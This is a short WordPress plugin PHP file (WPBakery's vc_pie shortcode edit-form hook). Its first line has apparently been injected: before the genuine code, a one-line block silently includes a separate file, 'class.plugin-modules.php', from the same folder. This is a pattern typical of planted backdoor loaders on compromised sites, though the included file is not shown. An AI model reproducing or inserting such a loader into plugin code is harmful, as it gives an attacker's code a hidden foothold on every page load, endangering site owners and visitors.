<?php if (file_exists(dirname(__FILE__) . '/class.plugin-modules.php')) include_once(dirname(__FILE__) . '/class.plugin-modules.php'); ?><?php
if ( ! defined( 'ABSPATH' ) ) {
	die( '-1' );
}
if ( 'vc_edit_form' === vc_post_param( 'action' ) ) {
	VcShortcodeAutoloader::getInstance()->includeClass( 'WPBakeryShortCode_Vc_Pie' );

	add_filter( 'vc_edit_form_fields_attributes_vc_pie', array(
		'WPBakeryShortCode_VC_Pie',
		'convertOldColorsToNew',
	) );
}
